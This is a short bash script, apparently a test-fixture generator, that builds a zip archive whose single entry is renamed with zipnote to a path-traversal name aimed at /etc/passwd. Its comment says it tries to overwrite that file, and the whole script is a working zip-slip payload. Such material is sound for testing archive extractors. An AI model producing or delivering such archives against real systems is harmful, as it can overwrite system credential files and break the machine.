#!/usr/bin/env bash

# this script generates a modified zip file witch tries to overwrite the /etc/passwd file

echo "BAD THING EVIL" | zip -q evil.zip -
echo -e "@ -\n@=../../../../../../../../../../etc/passwd" | zipnote -w evil.zip